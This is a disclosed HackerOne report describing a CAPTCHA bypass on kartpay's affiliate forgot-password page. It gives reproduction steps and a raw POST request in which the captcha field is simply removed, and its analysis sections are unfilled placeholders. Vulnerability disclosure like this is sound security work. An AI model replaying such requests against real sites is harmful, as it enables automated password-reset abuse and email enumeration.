---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '700075'
original_report_id: '700075'
title: bypass captcha in the form forgot password
weakness: Violation of Secure Design Principles
team_handle: kartpay
created_at: '2019-09-22T20:48:02.027Z'
disclosed_at: '2019-11-14T06:56:09.799Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 22
asset_identifier: '*.kartpay.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- violation-of-secure-design-principles
---

# bypass captcha in the form forgot password

## Metadata

- HackerOne Report ID: 700075
- Weakness: Violation of Secure Design Principles
- Program: kartpay
- Disclosed At: 2019-11-14T06:56:09.799Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
In this issue I can bypass Captcha Protection in the Forgot Password form.

## Browsers Verified In:
 firefox

url: https://affiliate.kartpay.com/
url vulnerable: https://affiliate.kartpay.com/forgot_password
## Steps To Reproduce:
1-Enter your email in the forgot password parameter.
2-complet captcha
3-Capture the request in the proxy.
4-delete captcha parameter from request.
5-check response

##Request:

POST /forgot_password HTTP/1.1
Host: affiliate.kartpay.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://affiliate.kartpay.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IjhjXC8zMFBQT3VFZW5VS2ZHSmVlRk1RPT0iLCJ2YWx1ZSI6Img2SjVsNHdhclVnaEI4dThmMGlWQXJVWHdWeGl1MjdTTFBKZkpiSCtsT2pQYld0Y0pvWURDa0RuNE9VQVU3NkkiLCJtYWMiOiI5ZDI0ZTE5YmQ1OWJhMmUwN2RjYzkzNjVhYTZiZDk1MzIzMjgyNzhjOWEyMmYwYzBmOGExZmEyNGE4MmU1YzIxIn0%3D; laravel_session=eyJpdiI6Incwcjc5S3JIbVpCSThoUWpiSmwwXC9RPT0iLCJ2YWx1ZSI6ImpZdGYrXC96cnBUS1oxb0FkRjA5anpiN013aTFLWFV5NlgzUG13SkpKRGVBT0NvYnpleEpZVWNmMWN6WitcLzF2QiIsIm1hYyI6ImUxMWQ4MjVlMzBjMDdkYWUxOWE2Zjk5OTc1OTFkMjBmNzJkNDkxMzZiY2RiOWJmMjA4MzVmNGQzZTZiMzc5ZjMifQ%3D%3D
Upgrade-Insecure-Requests: 1

_token=hIfAxen5jTB2IcWjjpkxAjb1j9Ro8nPtyhveLdoT&email=test%40gmail.com

##Response:
you can see it in the photo.

## Impact

email leakage

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
